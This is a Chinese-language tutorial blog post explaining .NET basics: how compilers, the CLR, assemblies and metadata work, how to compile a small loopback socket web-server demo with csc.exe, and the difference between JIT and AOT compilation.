<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code: 1+2 </span><br><span class="line">function 翻译方法(参数:code) </span><br><span class="line">&#123; </span><br><span class="line">    ... </span><br><span class="line">    &quot;1&quot;=&gt;&quot;001&quot;; </span><br><span class="line">    &quot;2&quot;=&gt;&quot;002&quot;;</span><br><span class="line">    &quot;+&quot;=&gt;&quot;000&quot;; </span><br><span class="line">    return 能让机器识别的二进制代码; </span><br><span class="line">&#125; </span><br><span class="line">call 翻译方法(&quot;1+2&quot;) =&gt; &quot;001 000 002&quot;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;所以从一门编程语言所编写的代码文件转换成能让本机识别的指令，这中间是需要一个翻译的过程。<br>&emsp;&emsp;而我们现在计算机上是运载着操作系统的，光翻译成机器指令也不行，还得让代码文件转化成可供操作系统执行的程序才行。<br>&emsp;&emsp;那么这些步骤，就是编程语言所对应的编译环节的工程了。这个翻译过程是需要工具来完成，我们把它叫做 编译器。<br>&emsp;&emsp;不同厂商的CPU有着不同的指令集，为了克服面向CPU的指令集的难读、难编、难记和易出错的缺点，后来就出现了面向特定CPU的特定汇编语言， 比如我打上这样的x86汇编指令 mov ax,bx ，然后用上用机器码做的汇编器，它将会被翻译成 1000100111011000 这样的二进制01格式的机器指令。<br>&emsp;&emsp;不同CPU架构上的汇编语言指令不同，而为了统一一套写法，同时又不失汇编的表达能力，C语言就诞生了。<br>&emsp;&emsp;用C语言写的代码文件，会被C编译器先转换成对应平台的汇编指令，再转成机器码，最后将这些过程中产生的中间模块链接成一个可以被操作系统执行的程序。<br>&emsp;&emsp;那么汇编语言和C语言比较，我们就不需要去阅读特定CPU的汇编码，我只需要写通用的C源码就可以实现程序的编写，我们用将更偏机器实现的汇编语言称为低级语言，与汇编相比，C语言就称之为高级语言。<br>&emsp;&emsp;在看看我们C#，我们在编码的时候都不需要过于偏向特定平台的实现，翻译过程也基本遵循这个过程。它的编译模型和C语言类似，都是属于这种间接转换的中间步骤，故而能够跨平台。<br>&emsp;&emsp;所以就类似于C/C#等这样的高级语言来说是不区分平台的，而在于其背后支持的这个 翻译原理 是否能支持其它平台。  </p>
<h1 id="什么是托管代码，托管语言，托管模块？"><a href="#什么是托管代码，托管语言，托管模块？" class="headerlink" title="什么是托管代码，托管语言，托管模块？"></a>什么是托管代码，托管语言，托管模块？</h1><p>&emsp;&emsp;作为一门年轻的语言，C#借鉴了许多语言的长处，与C比较，C#则更为高级。<br>&emsp;&emsp;往往一段简小的C#代码，其功能却相当于C的一大段代码，并且用C#语言你几乎不需要指针的使用，这也就意味着你几乎不需要进行人为的内存管控与安全考虑因素，也不需要多懂一些操作系统的知识，这让编写程序变得更加轻松和快捷。<br>&emsp;&emsp;如果说C#一段代码可以完成其它低级语言一大段任务，那么我们可以说它特性丰富或者类库丰富。而用C#编程不需要人为内存管控是怎么做到的呢？<br>&emsp;&emsp;.NET提供了一个垃圾回收器(GC)来完成这部分工作，当你创建类型的时候，它会自动给你分配所需要的这部分内存空间。就相当于，有一个专门的软件或进程，它会读取你的代码，然后当你执行这行代码的时候，它帮你做了内存分配工作。 这部分本该你做的工作，它帮你做了，这就是“托管”的概念。比如现实中 托管店铺、托管教育等这样的别人替你完成的概念。<br>&emsp;&emsp;因此，C#被称之为托管语言。C#编写的代码也就称之为托管代码,C#生成的模块称之为托管模块等。(对于托管的资源，是不需要也无法我们人工去干预的，但我们可以了解它的一些机制原理，在后文我会简单介绍。)<br>&emsp;&emsp;只要有比较，就会产生概念。那么在C#角度，那些脱离了.NET提供的诸如垃圾回收器这样的环境管制，就是对应的 非托管了。  </p>
<h2 id="非托管的异常"><a href="#非托管的异常" class="headerlink" title="非托管的异常"></a>非托管的异常</h2><p>&emsp;&emsp;我们编写的程序有的模块是由托管代码编写，有的模块则调用了非托管代码。在.NET Framework中也有一套基于此操作系统SEH的异常机制，理想的机制设定下我们可以直接通过<code>catch(e)</code>或<code>catch</code>来捕获指定的异常和框架设计人员允许我们捕获的异常。<br>&emsp;&emsp;而异常类型的级别也有大有小，有小到可以直接框架本身或用代码处理的，有大到需要操作系统的异常机制来处理。.NET会对那些能让程序崩溃的异常类型给进行标记，对于这部分异常，在.NET Framework 4.0之前允许开发人员在代码中自己去处理，但4.0版本之后有所变更，这些被标记的异常默认不会在托管环境中抛出(即无法catch到)，而是由操作系统的SEH机制去处理。<br>&emsp;&emsp;不过如果你仍然想在代码中捕获处理这样的异常也是可以的，你可以对需要捕获的方法上标记<code>[System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptionsAttribute]</code>特性，就可以在该方法内通过<code>catch</code>捕获到该类型的异常。你也可以通过在配置文件中添加运行时节点来对全局进行这样的一个配置：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;runtime&gt;</span><br><span class="line">    &lt;legacyCorruptedStateExceptionsPolicy enabled=&quot;true&quot; /&gt;</span><br><span class="line">&lt;/runtime&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;HandleProcessCorruptedStateExceptions特性：<a href="https://msdn.microsoft.com/zh-cn/library/azure/system.runtime.exceptionservices.handleprocesscorruptedstateexceptionsattribute.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/azure/system.runtime.exceptionservices.handleprocesscorruptedstateexceptionsattribute.aspx</a><br>&emsp;&emsp;SEHException类：<a href="https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.sehexception(v=vs.100).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.sehexception(v=vs.100).aspx</a><br>&emsp;&emsp;处理损坏状态异常博客专栏： <a href="https://msdn.microsoft.com/zh-cn/magazine/dd419661.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/magazine/dd419661.aspx</a>  </p>
<h1 id="什么是CLR，-NET虚拟机？"><a href="#什么是CLR，-NET虚拟机？" class="headerlink" title="什么是CLR，.NET虚拟机？"></a>什么是CLR，.NET虚拟机？</h1><p>&emsp;&emsp;实际上，.NET不仅提供了自动内存管理的支持，他还提供了一些列的如类型安全、应用程序域、异常机制等支持，这些 都被统称为CLR公共语言运行库。<br>&emsp;&emsp;CLR是.NET类型系统的基础，所有的.NET技术都是建立在此之上，熟悉它可以帮助我们更好的理解框架组件的核心、原理。<br>&emsp;&emsp;在我们执行托管代码之前，总会先运行这些运行库代码，通过运行库的代码调用，从而构成了一个用来支持托管程序的运行环境，进而完成诸如不需要开发人员手动管理内存，一套代码即可在各大平台跑的这样的操作。<br>&emsp;&emsp;这套环境及体系之完善，以至于就像一个小型的系统一样，所以通常形象的称CLR为”.NET虚拟机”。那么，如果以进程为最低端，进程的上面就是.NET虚拟机(CLR)，而虚拟机的上面才是我们的托管代码。换句话说，托管程序实际上是寄宿于.NET虚拟机中。  </p>
<h1 id="什么是CLR宿主进程，运行时主机？"><a href="#什么是CLR宿主进程，运行时主机？" class="headerlink" title="什么是CLR宿主进程，运行时主机？"></a>什么是CLR宿主进程，运行时主机？</h1><p>&emsp;&emsp;那么相对应的，容纳.NET虚拟机的进程就是CLR宿主进程了，该程序称之为运行时主机。<br>&emsp;&emsp;这些运行库的代码，全是由C/C++编写，具体表现为以 <code>mscoree.dll</code> 为代表的核心dll文件，该dll提供了N多函数用来构建一个CLR环境 ，最后当运行时环境构建完毕(一些函数执行完毕)后，调用<code>_CorDllMain</code>或<code>_CorExeMain</code>来查找并执行托管程序的入口方法(如控制台就是Main方法)。<br>&emsp;&emsp;如果你足够熟悉CLR，那么你完全可以在一个非托管程序中通过调用运行库函数来定制CLR并执行托管代码。<br>&emsp;&emsp;像SqlServer就集成了CLR，可以使用任何 .NET Framework 语言编写存储过程、触发器、用户定义类型、用户定义函数（标量函数和表值函数）以及用户定义的聚合函数。<br>&emsp;&emsp;有关CLR大纲介绍： <a href="https://msdn.microsoft.com/zh-cn/library/9x0wh2z3(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/9x0wh2z3(v=vs.85).aspx</a><br>&emsp;&emsp;CLR集成： <a href="https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-server-2008/ms131052(v%3dsql.100)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-server-2008/ms131052(v%3dsql.100)</a><br>&emsp;&emsp;构造CLR的接口：<a href="https://msdn.microsoft.com/zh-cn/library/ms231039(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/ms231039(v=vs.85).aspx</a><br>&emsp;&emsp;适用于 .NET Framework 2.0 的宿主接口：<a href="https://msdn.microsoft.com/zh-cn/library/ms164336(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/ms164336(v=vs.85).aspx</a><br>&emsp;&emsp;选择CLR版本： <a href="https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element</a><br>&emsp;&emsp;所以C#编写的程序如果想运行就必须要依靠.NET提供的CLR环境来支持。 而CLR是.NET技术框架中的一部分，故只要在Windows系统中安装.NET Framework即可。  </p>
<h1 id="Windows系统自带-NET-Framework"><a href="#Windows系统自带-NET-Framework" class="headerlink" title="Windows系统自带.NET Framework"></a>Windows系统自带.NET Framework</h1><p>&emsp;&emsp;Windows系统默认安装的有.NET Framework，并且可以安装多个.NET Framework版本，你也不需要因此卸载，因为你使用的应用程序可能依赖于特定版本，如果你移除该版本，则应用程序可能会中断。<br>&emsp;&emsp;Microsoft .NET Framework百度百科下有windows系统默认安装的.NET版本<br><img src="1026815-20180626193928463-1860763399.png" alt=" "><br>&emsp;&emsp;图出自 <a href="https://baike.baidu.com/item/Microsoft%20.NET%20Framework/9926417?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/Microsoft%20.NET%20Framework/9926417?fr=aladdin</a>  </p>
<h1 id="NET-Framework-4-0-30319"><a href="#NET-Framework-4-0-30319" class="headerlink" title=".NET Framework 4.0.30319"></a>.NET Framework 4.0.30319</h1><p>&emsp;&emsp;在%SystemRoot%\Microsoft.NET下的Framework和Framework64文件夹中分别可以看到32位和64位的.NET Framework安装的版本。<br>&emsp;&emsp;我们点进去可以看到以.NET版本号为命名的文件夹，有2.0,3.0,3.5,4.0这几个文件夹。<br><img src="1026815-20180626190844595-825495686.png" alt=" ">  </p>
<h2 id="NET-Framework4-X覆盖更新"><a href="#NET-Framework4-X覆盖更新" class="headerlink" title=".NET Framework4.X覆盖更新"></a>.NET Framework4.X覆盖更新</h2><p>&emsp;&emsp;要知道.NET Framework版本目前已经迭代到4.7系列，电脑上明明安装了比4.0更高版本的.NET Framework，然而从文件夹上来看，最高不过4.0，这是为何？<br>&emsp;&emsp;原来自.NET Framework 4以来的所有.NET Framework版本都是直接在v4.0.30319文件夹上覆盖更新，并且无法安装以前的4.x系列的老版本，所以v4.0.30319这个目录中其实放的是你最后一次更新的NET Framework版本。<br>&emsp;&emsp;.NET Framework覆盖更新：<a href="https://docs.microsoft.com/en-us/dotnet/framework/install/guide-for-developers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/install/guide-for-developers</a>  </p>
<h2 id="如何确认本机安装了哪些-NET-Framework和对应CLR的版本？"><a href="#如何确认本机安装了哪些-NET-Framework和对应CLR的版本？" class="headerlink" title="如何确认本机安装了哪些.NET Framework和对应CLR的版本？"></a>如何确认本机安装了哪些.NET Framework和对应CLR的版本？</h2><p>&emsp;&emsp;我们可以通过注册表等其它方式来查看安装的最新版本：<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed</a> 。<br>&emsp;&emsp;不过如果不想那么复杂的话，还有种最直接简单的：<br>&emsp;&emsp;那就是进入该目录文件夹，随便找到几个文件对其右键，然后点击详细信息即可查看到对应的文件版本，可以依据文件版本估摸出.NET Framework版本，比如csc.exe文件。<br><img src="1026815-20180626191049347-855171658.png" alt=" ">  </p>
<h1 id="什么是程序集"><a href="#什么是程序集" class="headerlink" title="什么是程序集"></a>什么是程序集</h1><p>&emsp;&emsp;上文我介绍了编译器，即将源代码文件给翻译成一个计算机可识别的二进制程序。而在.NET Framework目录文件夹中就附带的有 用于C#语言的命令行形式的编译器<code>csc.exe</code> 和 用于VB语言的命令行形式的编译器<code>vbc.exe</code>。<br>&emsp;&emsp;我们通过编译器可以将后缀为<code>.cs(C#)</code>和<code>.vb(VB)</code>类型的文件编译成程序集。<br>&emsp;&emsp;程序集是一个抽象的概念，不同的编译选项会产生不同形式的程序集。以文件个数来区分的话，那么就分 单文件程序集(即一个文件)和多文件程序集(多个文件)。  </p>
<p>&emsp;&emsp;而不论是单文件程序集还是多文件程序集，其总有一个核心文件，就是表现为后缀为<code>.dll</code>或<code>.exe</code>格式的文件。它们都是标准的PE格式的文件，主要由4部分构成：  </p>
<ol>
<li>PE头，即Windows系统上的可移植可执行文件的标准格式 </li>
<li>CLR头，它是托管模块特有的，它主要包括 <ol>
<li>程序入口方法</li>
<li>CLR版本号等一些标志</li>
<li>一个可选的强名称数字签名</li>
<li>元数据表，主要用来记录了在源代码中定义和引用的所有的类型成员(如方法、字段、属性、参数、事件…)的位置和其标志Flag(各种修饰符)<br>&emsp;&emsp;正是因为元数据表的存在，VS才能智能提示，反射才能获取MemberInfo，CLR扫描元数据表即可获得该程序集的相关重要信息，所以元数据表使得程序集拥有了自我描述的这一特性。clr2中，元数据表大概40多个，其核心按照用途分为3类： <ol>
<li>即用于记录在源代码中所定义的类型的定义表：ModuleDef、TypeDef、MethodDef、ParamDef、FieldDef、PropertyDef、EventDef，</li>
<li>引用了其它程序集中的类型成员的引用表：MemberRef、AssemblyRef、ModuleRef、TypeRef</li>
<li>用于描述一些杂项(如版本、发布者、语言文化、多文件程序集中的一些资源文件等)的清单表：AssemblyDef、FileDef、ManifestResourceDef、ExportedTypeDef</li>
</ol>
</li>
</ol>
</li>
<li>IL代码(也称MSIL，后来被改名为CIL：Common Intermediate Language通用中间语言)，是介于源代码和本机机器指令中间的代码，将通过CLR在不同的平台产生不同的二进制机器码。 </li>
<li>一些资源文件  </li>
</ol>
<p>&emsp;&emsp;多文件程序集的诞生场景有：比如我想为.exe绑定资源文件(如Icon图标)，或者我想按照功能以增量的方式来按需编译成.dll文件。 通常很少情况下才会将源代码编译成多文件程序集，并且在VS IDE中总是将源代码给编译成单文件的程序集(要么是.dll或.exe)，所以接下来我就以单文件程序集为例来讲解。  </p>
<h1 id="用csc-exe进行编译"><a href="#用csc-exe进行编译" class="headerlink" title="用csc.exe进行编译"></a>用csc.exe进行编译</h1><p>&emsp;&emsp;现在，我将演示一段文本是如何被csc.exe编译成一个可执行的控制台程序的。<br>&emsp;&emsp;我们新建个记事本，然后将下面代码复制上去。  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">string</span> rootDirectory = Environment.CurrentDirectory;</span><br><span class="line">        Console.WriteLine(<span class="string">"开始连接，端口号：8090"</span>);</span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">        socket.Bind(<span class="keyword">new</span> System.Net.IPEndPoint(System.Net.IPAddress.Loopback, <span class="number">8090</span>));</span><br><span class="line">        socket.Listen(<span class="number">30</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Socket socketClient = socket.Accept();</span><br><span class="line">            Console.WriteLine(<span class="string">"新请求"</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="keyword">int</span> length = socketClient.Receive(buffer, <span class="number">4096</span>, SocketFlags.None);</span><br><span class="line">            <span class="keyword">string</span> requestStr = Encoding.UTF8.GetString(buffer, <span class="number">0</span>, length);</span><br><span class="line">            Console.WriteLine(requestStr);</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="keyword">string</span>[] strs = requestStr.Split(<span class="keyword">new</span> <span class="keyword">string</span>[] &#123; <span class="string">"\r\n"</span> &#125;, StringSplitOptions.None);</span><br><span class="line">            <span class="keyword">string</span> url = strs[<span class="number">0</span>].Split(<span class="string">' '</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] statusBytes, headerBytes, bodyBytes;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Path.GetExtension(url) == <span class="string">".jpg"</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> status = <span class="string">"HTTP/1.1 200 OK\r\n"</span>;</span><br><span class="line">                statusBytes = Encoding.UTF8.GetBytes(status);</span><br><span class="line">                bodyBytes = File.ReadAllBytes(rootDirectory + url);</span><br><span class="line">                <span class="keyword">string</span> header = <span class="keyword">string</span>.Format(<span class="string">"Content-Type:image/jpg;\r\ncharset=UTF-8\r\nContent-Length:&#123;0&#125;\r\n"</span>, bodyBytes.Length);</span><br><span class="line">                headerBytes = Encoding.UTF8.GetBytes(header);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (url == <span class="string">"/"</span>)</span><br><span class="line">                    url = <span class="string">"默认页"</span>;</span><br><span class="line">                <span class="keyword">string</span> status = <span class="string">"HTTP/1.1 200 OK\r\n"</span>;</span><br><span class="line">                statusBytes = Encoding.UTF8.GetBytes(status);</span><br><span class="line">                <span class="keyword">string</span> body = <span class="string">"&lt;html&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;head&gt;"</span> +</span><br><span class="line">                        <span class="string">"&lt;title&gt;socket webServer  -- Login&lt;/title&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;/head&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;body&gt;"</span> +</span><br><span class="line">                       <span class="string">"&lt;div style=\"text-align:center\"&gt;"</span> +</span><br><span class="line">                           <span class="string">"当前访问"</span> + url +</span><br><span class="line">                       <span class="string">"&lt;/div&gt;"</span> +</span><br><span class="line">                    <span class="string">"&lt;/body&gt;"</span> +</span><br><span class="line">                <span class="string">"&lt;/html&gt;"</span>;</span><br><span class="line">                bodyBytes = Encoding.UTF8.GetBytes(body);</span><br><span class="line">                <span class="keyword">string</span> header = <span class="keyword">string</span>.Format(<span class="string">"Content-Type:text/html;charset=UTF-8\r\nContent-Length:&#123;0&#125;\r\n"</span>, bodyBytes.Length);</span><br><span class="line">                headerBytes = Encoding.UTF8.GetBytes(header);</span><br><span class="line">            &#125;</span><br><span class="line">            socketClient.Send(statusBytes);</span><br><span class="line">            socketClient.Send(headerBytes);</span><br><span class="line">            socketClient.Send(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; (<span class="keyword">byte</span>)<span class="string">'\r'</span>, (<span class="keyword">byte</span>)<span class="string">'\n'</span> &#125;);</span><br><span class="line">            socketClient.Send(bodyBytes);</span><br><span class="line"></span><br><span class="line">            socketClient.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后关闭记事本，将之.txt的后缀改为.cs的后缀(后缀是用来标示这个文件是什么类型的文件，并不影响文件的内容)。<br>&emsp;&emsp;上述代码相当于Web中的http.sys伪实现，是建立了通信的socket服务端，并通过while循环来不断的监视获取包的数据实现最基本的监听功能，最终我们将通过csc.exe将该文本文件编译成一个控制台程序。<br>&emsp;&emsp;我已经在前面讲过BCL，基础类库。在这部分代码中，为了完成我想要的功能，我用到了微软已经帮我们实现好了的<code>String</code>数据类型系列类(.NET下的一些数据类型)、<code>Environment</code>类(提供有关当前环境和平台的信息以及操作它们的方法)、<code>Console</code>类(用于控制台输入输出等)、<code>Socket</code>系列类(对tcp协议抽象的接口)、<code>File</code>文件系列类(对文件目录等操作系统资源的一些操作)、<code>Encoding</code>类(字符流的编码)等<br>&emsp;&emsp;这些类，都属于BCL中的一部分，它们存在但不限于<code>mscorlib.dll</code>、<code>System.dll</code>、<code>System.core.dll</code>、<code>System.Data.dll</code>等这些程序集中。<br>&emsp;&emsp;附：不要纠结BCL到底存在于哪些dll中，总之，它是个物理分散，逻辑上的类库总称。<br>&emsp;&emsp;mscorlib.dll和System.dll的区别：<a href="https://stackoverflow.com/questions/402582/mscorlib-dll-system-dll" target="_blank" rel="noopener">https://stackoverflow.com/questions/402582/mscorlib-dll-system-dll</a><br>&emsp;&emsp;因为我用了这些类，那么按照编程规则我必须在代码中using这些类的命名空间，并通过<code>csc.exe</code>中的 <code>/r:dll</code>路径 命令来为生成的程序集注册元数据表(即以AssemblyRef为代表的程序集引用表)。<br>&emsp;&emsp;而这些代码引用了4个命名空间，但实际上它们只被包含在<code>mscorlib.dll</code>和<code>System.dll</code>中，那么我只需要在编译的时候注册这两个dll的信息就行了。  </p>
<p>&emsp;&emsp;好，接下来我将通过<code>cmd</code>运行<code>csc.exe</code>编译器，再输入编译命令： <code>csc /out:D:\demo.exe D:\dic\demo.cs /r:D:\dic\System.dll</code>  </p>
<ul>
<li><code>/r</code>：是将引用dll中的类型数据注册到程序集中的元数据表中。  </li>
<li><code>/out</code>:是输出文件的意思，如果没有该命令则默认输出<code>{name}.exe</code>。  </li>
</ul>
<p>&emsp;&emsp;使用csc.exe编译生成： <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe</a><br>&emsp;&emsp;csc编译命令行介绍：<a href="https://www.cnblogs.com/shuang121/archive/2012/12/24/2830874.html" target="_blank" rel="noopener">https://www.cnblogs.com/shuang121/archive/2012/12/24/2830874.html</a><br>&emsp;&emsp;总之，你除了要掌握基本的编译指令外，当你打上这行命令并按回车后，必须满足几个条件，1.是.cs后缀的c#格式文件，2.是 代码语法等检测分析必须正确，3.是 使用的类库必须有出处(引用的dll)，当然 因为我是编译为控制台程序，所以还必须得有个静态Main方法入口，以上缺一不可。<br>&emsp;&emsp;可以看出，这段命令我是将 位于D:\dic\的demo.cs文件给编译成 位于D:\名为demo.exe的控制台文件，并且因为在代码中使用到了System.dll，所以还需要通过/r注册该元数据表。<br>&emsp;&emsp;这里得注意为什么没有<code>/r:mscorlib.dll</code>,因为mscorlib.dll地位的特殊，所以csc总是对每个程序集进行mscorlib.dll的注册(自包含引用该dll),因此我们可以不用<code>/r:mscorlib.dll</code>这个引用命令，但为了演示效果我还是决定通过<code>/nostdlib</code>命令来禁止csc默认导入mscorlib.dll文件。<br>&emsp;&emsp;所以，最终命令是这样的： <code>csc D:\dic\demo.cs /r:D:\dic\mscorlib.dll /r:D:\dic\System.dll /nostdlib</code><br><img src="1026815-20180626192059660-977860665.png" alt=" "><br>&emsp;&emsp;因为没有指定输出文件<code>/out</code>选项， 所以会默认输出在与csc同一目录下名为demo.exe的文件。事实上，在csc的命令中，如果你没有指定路径，那么就默认采用在csc.exe的所在目录的相对路径。<br><img src="1026815-20180626192159540-608756226.png" alt=" "><br>&emsp;&emsp;而我们可以看到，在该目录下有许多程序集，其中就包含我们需要的System.dll和mscorlib.dll，所以我们完全可以直接<code>/r:mscorlib.dll /r:System.dll</code><br>&emsp;&emsp;而类似于System.dll、System.Data.dll这样使用非常频繁的程序集，我们其实不用每次编译的时候都去手动/r一下，对于需要重复劳动的编译指令，我们可以将其放在后缀为.rsp的指令文件中，然后在编译时直接调用文件即可执行里面的命令 <code>@ {name}.rsp</code>。<br><img src="1026815-20180626192239508-1912250944.png" alt=" "><br>&emsp;&emsp;csc.exe默认包含csc.rsp文件,我们可以用<code>/noconfig</code>来禁止默认包含，而csc.rsp里面已经写好了我们会经常用到的指令。<br>&emsp;&emsp;所以，最终我可以这样写 <code>csc D:\dic\demo.cs</code> 直接生成控制台应用程序。<br><img src="1026815-20180626193627595-1254138010.gif" alt=" ">  </p>
<h1 id="NET程序执行原理"><a href="#NET程序执行原理" class="headerlink" title=".NET程序执行原理"></a>.NET程序执行原理</h1><p>&emsp;&emsp;好的，现在我们已经有了一个demo.exe的可执行程序，它是如何被我们运行的？<br>&emsp;&emsp;C#源码被编译成程序集，程序集内主要是由一些元数据表和IL代码构成，我们双击执行该exe，Windows加载器将该exe(PE格式文件)给映射到虚拟内存中，程序集的相关信息都会被加载至内存中，并查看PE文件的入口点  (EntryPoint)并跳转至指定的mscoree.dll中的<code>_CorExeMain</code>函数，该函数会执行一系列相关dll来构造CLR环境，当CLR预热后调用该程序集的入口方法<code>Main()</code>，接下来由CLR来执行托管代码(IL代码)。  </p>
<h2 id="JIT编译"><a href="#JIT编译" class="headerlink" title="JIT编译"></a>JIT编译</h2><p>&emsp;&emsp;前面说了，计算机最终只识别二进制的机器码，在CLR下有一个用来将IL代码转换成机器码的引擎，称为Just In Time Compiler，简称JIT，CLR总是先将IL代码按需通过该引擎编译成机器指令再让CPU执行，在这期间CLR会验证代码和元数据是否类型安全(在对象上只调用正确定义的操作、标识与声称的要求一致、对类型的引用严格符合所引用的类型)，被编译过的代码无需JIT再次编译，而被编译好的机器指令是被存在内存当中，当程序关闭后再打开仍要重新JIT编译。  </p>
<h2 id="AOT编译"><a href="#AOT编译" class="headerlink" title="AOT编译"></a>AOT编译</h2><p>&emsp;&emsp;CLR的内嵌编译器是即时性的，这样的一个很明显的好处就是可以根据当时本机情况生成更有利于本机的优化代码，但同样的，每次在对代码编译时都需要一个预热的操作，它需要一个运行时环境来支持，这之间还是有消耗的。<br>&emsp;&emsp;而与即时编译所对应的，就是提前编译了，英文为Ahead of Time Compilation，简称AOT，也称之为静态编译。<br>&emsp;&emsp;在.NET中，使用<code>Ngen.exe</code>或者开源的<code>.NET Native</code>可以提前将代码编译成本机指令。<br>&emsp;&emsp;Ngen是将IL代码提前给全部编译成本机代码并安装在本机的本机映像缓存中，故而可以减少程序因JIT预热的时间，但同样的也会有很多注意事项，比如因JIT的丧失而带来的一些特性就没有了，如类型验证。Ngen仅是尽可能代码提前编译，程序的运行仍需要完整的CLR来支持。<br>&emsp;&emsp;.NET Native在将IL转换为本机代码的时候，会尝试消除所有元数据将依靠反射和元数据的代码替换为静态本机代码，并且将完整的CLR替换为主要包含垃圾回收器的重构运行时<code>mrt100_app.dll</code>。<br>&emsp;&emsp;.NET Native: <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/net-native/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/net-native/</a><br>&emsp;&emsp;Ngen.exe：<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/tools/ngen-exe-native-image-generator" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/tools/ngen-exe-native-image-generator</a><br>&emsp;&emsp;Ngen与.NET Native比较：<a href="https://www.zhihu.com/question/27997478/answer/38978762" target="_blank" rel="noopener">https://www.zhihu.com/question/27997478/answer/38978762</a>  </p>
<hr>
